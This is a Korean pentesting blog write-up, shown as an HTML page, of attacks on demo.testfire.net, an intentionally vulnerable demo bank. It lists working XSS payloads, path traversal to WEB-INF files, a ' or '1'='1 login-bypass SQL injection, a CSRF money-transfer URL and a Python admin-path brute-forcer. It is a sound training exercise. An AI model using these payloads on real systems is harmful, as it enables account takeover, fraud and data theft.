@@ -1,0 +1,784 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>[ VulnWebs ] - demo.testfire.net - A1mH1gh</title>
+<meta name="description" content="RECON  WAS: Apache   Information Leakage 비정상 데이터 전송을 통해 웹서버 내 오류를 발생시켜 웹서버 WAS 종류 및 버전 정보를 노출시킴 https://demo.testfire.net/index.jsp?content=../../   WAS: Apache Tomcat/7.0.92  XSS URL 요청 시 스크립트 구문을 삽입하여 브라우저에서 스크립트가 실행  XSS-1 사용자 입력을 그대로 반환하는 페이지가 존재 https://demo.testfire.net/search.jsp?query=&quot;&gt;1234    ?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;    XSS-2  비공개 설문조사 페이지는 ‘오픈소스’ 사이트에서 확인할수있었음 &lt;script&gt;alert`1`&lt;/script&gt;     XSS-3 https://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&amp;query=   &amp;query=&lt;script&gt;alert(1)&lt;/script&gt;     XSS-4 https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&amp;lang=   &amp;lang=&lt;script&gt;alert(1)&lt;/script&gt;    XSS-5 https://demo.testfire.net/feedback.jsp     Path Traversal 사용자로부터 특정 페이지를 입력받아 Include 해주는 기능이 존재함 (LFI) https://demo.testfire.net/index.jsp?content=inside_contact.htm  공격자는 상위 디렉토리 이동을 의미하는 ../를 사용하여 서버 내 주요 설정 파일들을 열람할 수 있음 ../WEB-INF/init.log ../WEB-INF/web.xml ../WEB-INF/app.properties   (위 계정으로 로그인은 되지 않음) SQLi 로그인 페이지에서 https://demo.testfire.net/login.jsp  아래 값을 전달하면 &#39; or &#39;1&#39;=&#39;1    admin으로 로그인 성공   CSRF 아래 URL 클릭만으로 ‘특정 계좌로 송금’이 가능함 https://demo.testfire.net/bank/doTransfer?fromAccount=800000&amp;toAccount=800001&amp;transferAmount=999&amp;transfer=Transfer%20Money     Admin Page Discloser 관리자 페이지를 찾기 위해 일반적인 관리자 페이지명(admin.html, manager.html, …)을 대입해보는 사전대입공격 수행 import requests  url = &#39;http://demo.testfire.net/&#39; urls = &#39;&#39;&#39; login.jsp admin/account.html admin/login.html admin/login.htm admin/home.jsp &#39;&#39;&#39; #words 모음 사이트 #https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/jsp.txt  cookies = { &#39;JSESSIONID&#39;: &#39;BFE82CD7D10AFB01E956532AA7205B0F&#39;, &#39;AltoroAccounts&#39; : &#39;ODAwMDAyflNhdmluZ3N+LTEuOTk5NTQzNDA3MDM5MTUyOUUxOHw4MDAwMDN+Q2hlY2tpbmd+MS4xODQ0Njc0NDA4Mzc2NTkyRTIwfDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+LTEuOTk5NTQzNDAxMjc4NzExNTVFMTh8&#39; } #일반 사용자 (쿠키)세션 전달 필요  arry = urls.split() for i in arry: 	r=requests.get(url+&#39;/&#39;+i,cookies=cookies) 	if r.status_code == 200: 		print(&#39;관리자 페이지: &#39;+url+&#39;/&#39;+i)   스크립트 결과 다음 URL을 확인할 수 있었음 http://demo.testfire.net/admin/admin.jsp      Done.">
+
+
+  <meta name="author" content="A1mH1gh">
+  
+  <meta property="article:author" content="A1mH1gh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="A1mH1gh">
+<meta property="og:title" content="[ VulnWebs ] - demo.testfire.net">
+<meta property="og:url" content="http://localhost:4000/vulnwebs_writeup/VulnWebs-demo.test.fire.net/">
+
+
+  <meta property="og:description" content="RECON  WAS: Apache   Information Leakage 비정상 데이터 전송을 통해 웹서버 내 오류를 발생시켜 웹서버 WAS 종류 및 버전 정보를 노출시킴 https://demo.testfire.net/index.jsp?content=../../   WAS: Apache Tomcat/7.0.92  XSS URL 요청 시 스크립트 구문을 삽입하여 브라우저에서 스크립트가 실행  XSS-1 사용자 입력을 그대로 반환하는 페이지가 존재 https://demo.testfire.net/search.jsp?query=&quot;&gt;1234    ?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;    XSS-2  비공개 설문조사 페이지는 ‘오픈소스’ 사이트에서 확인할수있었음 &lt;script&gt;alert`1`&lt;/script&gt;     XSS-3 https://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&amp;query=   &amp;query=&lt;script&gt;alert(1)&lt;/script&gt;     XSS-4 https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&amp;lang=   &amp;lang=&lt;script&gt;alert(1)&lt;/script&gt;    XSS-5 https://demo.testfire.net/feedback.jsp     Path Traversal 사용자로부터 특정 페이지를 입력받아 Include 해주는 기능이 존재함 (LFI) https://demo.testfire.net/index.jsp?content=inside_contact.htm  공격자는 상위 디렉토리 이동을 의미하는 ../를 사용하여 서버 내 주요 설정 파일들을 열람할 수 있음 ../WEB-INF/init.log ../WEB-INF/web.xml ../WEB-INF/app.properties   (위 계정으로 로그인은 되지 않음) SQLi 로그인 페이지에서 https://demo.testfire.net/login.jsp  아래 값을 전달하면 &#39; or &#39;1&#39;=&#39;1    admin으로 로그인 성공   CSRF 아래 URL 클릭만으로 ‘특정 계좌로 송금’이 가능함 https://demo.testfire.net/bank/doTransfer?fromAccount=800000&amp;toAccount=800001&amp;transferAmount=999&amp;transfer=Transfer%20Money     Admin Page Discloser 관리자 페이지를 찾기 위해 일반적인 관리자 페이지명(admin.html, manager.html, …)을 대입해보는 사전대입공격 수행 import requests  url = &#39;http://demo.testfire.net/&#39; urls = &#39;&#39;&#39; login.jsp admin/account.html admin/login.html admin/login.htm admin/home.jsp &#39;&#39;&#39; #words 모음 사이트 #https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/jsp.txt  cookies = { &#39;JSESSIONID&#39;: &#39;BFE82CD7D10AFB01E956532AA7205B0F&#39;, &#39;AltoroAccounts&#39; : &#39;ODAwMDAyflNhdmluZ3N+LTEuOTk5NTQzNDA3MDM5MTUyOUUxOHw4MDAwMDN+Q2hlY2tpbmd+MS4xODQ0Njc0NDA4Mzc2NTkyRTIwfDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+LTEuOTk5NTQzNDAxMjc4NzExNTVFMTh8&#39; } #일반 사용자 (쿠키)세션 전달 필요  arry = urls.split() for i in arry: 	r=requests.get(url+&#39;/&#39;+i,cookies=cookies) 	if r.status_code == 200: 		print(&#39;관리자 페이지: &#39;+url+&#39;/&#39;+i)   스크립트 결과 다음 URL을 확인할 수 있었음 http://demo.testfire.net/admin/admin.jsp      Done.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-11-27T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/vulnwebs_writeup/VulnWebs-demo.test.fire.net/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "A1mH1gh",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="A1mH1gh Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          A1mH1gh
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/HTB_Writeup/">HTB Writeup</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/VulnWebs_Writeup/">VulnWebs Writeup</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/img/bow.png" alt="A1mH1gh" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">A1mH1gh</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Pentesting Log</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Republic of Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:A1mH1gh4909@gmail.com" rel="me" class="u-email">
+            <meta itemprop="email" content="A1mH1gh4909@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="[ VulnWebs ] - demo.testfire.net">
+    <meta itemprop="description" content="RECONWAS: ApacheInformation Leakage비정상 데이터 전송을 통해 웹서버 내 오류를 발생시켜 웹서버 WAS 종류 및 버전 정보를 노출시킴https://demo.testfire.net/index.jsp?content=../../WAS: Apache Tomcat/7.0.92XSSURL 요청 시 스크립트 구문을 삽입하여 브라우저에서 스크립트가 실행XSS-1사용자 입력을 그대로 반환하는 페이지가 존재https://demo.testfire.net/search.jsp?query=&quot;&gt;1234?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;XSS-2비공개 설문조사 페이지는 ‘오픈소스’ 사이트에서 확인할수있었음&lt;script&gt;alert`1`&lt;/script&gt;XSS-3https://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&amp;query=&amp;query=&lt;script&gt;alert(1)&lt;/script&gt;XSS-4https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&amp;lang=&amp;lang=&lt;script&gt;alert(1)&lt;/script&gt;XSS-5https://demo.testfire.net/feedback.jspPath Traversal사용자로부터 특정 페이지를 입력받아 Include 해주는 기능이 존재함 (LFI)https://demo.testfire.net/index.jsp?content=inside_contact.htm공격자는 상위 디렉토리 이동을 의미하는 ../를 사용하여 서버 내 주요 설정 파일들을 열람할 수 있음../WEB-INF/init.log../WEB-INF/web.xml../WEB-INF/app.properties(위 계정으로 로그인은 되지 않음)SQLi로그인 페이지에서https://demo.testfire.net/login.jsp아래 값을 전달하면&#39; or &#39;1&#39;=&#39;1admin으로 로그인 성공CSRF아래 URL 클릭만으로 ‘특정 계좌로 송금’이 가능함https://demo.testfire.net/bank/doTransfer?fromAccount=800000&amp;toAccount=800001&amp;transferAmount=999&amp;transfer=Transfer%20MoneyAdmin Page Discloser관리자 페이지를 찾기 위해 일반적인 관리자 페이지명(admin.html, manager.html, …)을 대입해보는 사전대입공격 수행import requestsurl = &#39;http://demo.testfire.net/&#39;urls = &#39;&#39;&#39;login.jspadmin/account.htmladmin/login.htmladmin/login.htmadmin/home.jsp&#39;&#39;&#39;#words 모음 사이트#https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/jsp.txtcookies = {&#39;JSESSIONID&#39;: &#39;BFE82CD7D10AFB01E956532AA7205B0F&#39;,&#39;AltoroAccounts&#39; : &#39;ODAwMDAyflNhdmluZ3N+LTEuOTk5NTQzNDA3MDM5MTUyOUUxOHw4MDAwMDN+Q2hlY2tpbmd+MS4xODQ0Njc0NDA4Mzc2NTkyRTIwfDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+LTEuOTk5NTQzNDAxMjc4NzExNTVFMTh8&#39;}#일반 사용자 (쿠키)세션 전달 필요arry = urls.split()for i in arry:	r=requests.get(url+&#39;/&#39;+i,cookies=cookies)	if r.status_code == 200:		print(&#39;관리자 페이지: &#39;+url+&#39;/&#39;+i)스크립트 결과 다음 URL을 확인할 수 있었음http://demo.testfire.net/admin/admin.jspDone.">
+    <meta itemprop="datePublished" content="2022-11-27T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4000/vulnwebs_writeup/VulnWebs-demo.test.fire.net/" class="u-url" itemprop="url">[ VulnWebs ] - demo.testfire.net
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#recon">RECON</a></li><li><a href="#information-leakage">Information Leakage</a></li><li><a href="#xss">XSS</a><ul><li><a href="#xss-1">XSS-1</a></li><li><a href="#xss-2">XSS-2</a></li><li><a href="#xss-3">XSS-3</a></li><li><a href="#xss-4">XSS-4</a></li><li><a href="#xss-5">XSS-5</a></li></ul></li><li><a href="#path-traversal">Path Traversal</a></li><li><a href="#sqli">SQLi</a></li><li><a href="#csrf">CSRF</a></li><li><a href="#admin-page-discloser">Admin Page Discloser</a></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482041-6271efa9-6b8c-4960-b79d-5e0c335591c8.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207833146-adf2f2fa-9a0c-4a4d-8839-1283c06d5be1.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/100695923/205482007-74b6e5ab-f7eb-42cf-9665-06e5c49478d4.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAS: Apache
+</code></pre></div></div>
+
+<h2 id="information-leakage">Information Leakage</h2>
+<p>비정상 데이터 전송을 통해 웹서버 내 오류를 발생시켜 웹서버 WAS 종류 및 버전 정보를 노출시킴</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/index.jsp?content=../../
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204819783-16aceb24-c0e7-446c-9bcd-b7888a9d7c6a.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAS: Apache Tomcat/7.0.92
+</code></pre></div></div>
+<h2 id="xss">XSS</h2>
+<p>URL 요청 시 스크립트 구문을 삽입하여 브라우저에서 스크립트가 실행</p>
+
+<h3 id="xss-1">XSS-1</h3>
+<p>사용자 입력을 그대로 반환하는 페이지가 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/search.jsp?query="&gt;1234
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/100695923/204802022-a58fd738-f8eb-4151-803a-cf3a2b8cac45.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204803131-6841b5e6-5053-4224-b09f-51ca50348609.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/204802997-3a479c22-4430-4dfd-942a-3ba221e37fcd.png" alt="image" /></p>
+<h3 id="xss-2">XSS-2</h3>
+
+<p>비공개 설문조사 페이지는 ‘오픈소스’ 사이트에서 확인할수있었음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert`1`&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204817552-488a5670-71f9-44cc-aeee-13cf06562fe6.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/204818865-8d3fc94b-a41f-4154-9614-754631b1a57b.png" alt="image" /></p>
+
+<h3 id="xss-3">XSS-3</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&amp;query=
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204948862-0199ec35-eef4-4571-a715-6ffcfb156c43.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;query=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/56434196/204948772-bac46efd-50a4-4888-888c-3ead34470ed7.png" alt="image" /></p>
+
+<h3 id="xss-4">XSS-4</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/bank/customize.jsp?content=customize.jsp&amp;lang=
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204950681-f17be783-c944-44c1-8eaa-8ca537685363.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;lang=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204950832-f923e303-0f6f-487a-a2c8-a08e4b70e344.png" alt="image" /></p>
+
+<h3 id="xss-5">XSS-5</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/feedback.jsp
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204951956-5f5e0a39-7cfd-49b9-bbbd-8065b52ff54b.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/204951986-bf504375-dffd-4dc9-9436-00a2e5aaeac2.png" alt="image" /></p>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>사용자로부터 특정 페이지를 입력받아 Include 해주는 기능이 존재함 (LFI)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/index.jsp?content=inside_contact.htm
+</code></pre></div></div>
+<p>공격자는 상위 디렉토리 이동을 의미하는 <code class="language-plaintext highlighter-rouge">../</code>를 사용하여 서버 내 주요 설정 파일들을 열람할 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../WEB-INF/init.log
+../WEB-INF/web.xml
+../WEB-INF/app.properties
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/204825917-7c8f7d58-c9d4-4768-a678-786f13284708.png" alt="image" />
+(위 계정으로 로그인은 되지 않음)</p>
+<h2 id="sqli">SQLi</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/login.jsp
+</code></pre></div></div>
+<p>아래 값을 전달하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or '1'='1
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204945864-cb6b774b-1cac-4d88-a60e-8ea0d023f632.png" alt="image" /></p>
+
+<p>admin으로 로그인 성공
+<img src="https://user-images.githubusercontent.com/56434196/204946796-a0924391-97e0-45db-ac50-6598e3d7e500.png" alt="image" /></p>
+
+<h2 id="csrf">CSRF</h2>
+<p>아래 URL 클릭만으로 ‘특정 계좌로 송금’이 가능함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://demo.testfire.net/bank/doTransfer?fromAccount=800000&amp;toAccount=800001&amp;transferAmount=999&amp;transfer=Transfer%20Money
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/204953415-ce3c4c8f-34aa-447f-9b6e-ec7d5d5630af.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/204953670-c35cff70-3296-403e-8b7f-6ef940c6957d.png" alt="image" /></p>
+
+<h2 id="admin-page-discloser">Admin Page Discloser</h2>
+<p>관리자 페이지를 찾기 위해 일반적인 관리자 페이지명(admin.html, manager.html, …)을 대입해보는 사전대입공격 수행</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://demo.testfire.net/'</span>
+<span class="n">urls</span> <span class="o">=</span> <span class="s">'''
+login.jsp
+admin/account.html
+admin/login.html
+admin/login.htm
+admin/home.jsp
+'''</span>
+<span class="c1">#words 모음 사이트
+#https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/jsp.txt
+</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+<span class="s">'JSESSIONID'</span><span class="p">:</span> <span class="s">'BFE82CD7D10AFB01E956532AA7205B0F'</span><span class="p">,</span>
+<span class="s">'AltoroAccounts'</span> <span class="p">:</span> <span class="s">'ODAwMDAyflNhdmluZ3N+LTEuOTk5NTQzNDA3MDM5MTUyOUUxOHw4MDAwMDN+Q2hlY2tpbmd+MS4xODQ0Njc0NDA4Mzc2NTkyRTIwfDQ1MzkwODIwMzkzOTYyODh+Q3JlZGl0IENhcmR+LTEuOTk5NTQzNDAxMjc4NzExNTVFMTh8'</span>
+<span class="p">}</span>
+<span class="c1">#일반 사용자 (쿠키)세션 전달 필요
+</span>
+<span class="n">arry</span> <span class="o">=</span> <span class="n">urls</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arry</span><span class="p">:</span>
+	<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'/'</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">'관리자 페이지: '</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="s">'/'</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>스크립트 결과 다음 URL을 확인할 수 있었음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://demo.testfire.net/admin/admin.jsp
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205480324-515fc850-8e76-4a23-bbb2-fd0400e4e982.png" alt="image" />
+<br />
+<br />
+<br />
+Done.</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#vulnwebs-writeup" class="page__taxonomy-item p-category" rel="tag">VulnWebs_Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-11-27T00:00:00+09:00">November 27, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%5B+VulnWebs+%5D+-+demo.testfire.net%20http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-demo.test.fire.net%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-demo.test.fire.net%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-demo.test.fire.net%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/vulnwebs_writeup/VulnWebs-GettingStarted/" class="pagination--pager" title="[ VulnWebs ] - Getting Started
+">Previous</a>
+    
+    
+      <a href="/vulnwebs_writeup/VulnWebs-zero.webappsecurity.com/" class="pagination--pager" title="[ VulnWebs ] - zero.webappsecurity.com
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-x.x.137.97/" rel="permalink">[ VulnWebs ] - x.x.137.97
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">RECON
+
+OS: CentOS
+WAS: Apache/2.4.6
+Lang: PHP/7.2.34
+
+File Upload
+업로드 페이지가 존재하며
+http://x.x.137.97/upload.php
+
+
+
+확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도
+import reque...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" rel="permalink">[ VulnWebs ] - testhtml5.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+WAS: Nginx/1.19.0
+
+
+XSS
+
+로그인 페이지에서
+http://testhtml5.vulnweb.com/#/popular
+
+스크립트 구문으로 로그인 하면
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+
+...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/" rel="permalink">[ VulnWebs ] - testaspnet.vulnweb.com
